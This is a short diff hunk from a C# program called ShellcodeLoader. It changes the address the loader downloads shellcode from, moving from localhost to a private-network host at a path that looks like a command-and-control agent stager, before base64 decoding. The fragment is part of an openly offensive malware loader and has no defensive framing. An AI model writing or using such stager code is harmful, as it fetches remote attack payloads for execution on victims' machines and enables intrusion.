@@ -95,7 +95,7 @@ namespace ShellcodeLoader
             using (var client = new WebClient())
             {
                 // Download the shellcode
-                shellcode = client.DownloadData("http://127.0.0.1:8081/agents/windows/cs");
+                shellcode = client.DownloadData("http://192.168.56.1:8081/agents/windows/cs");
             }
 
             // Base64 decoding
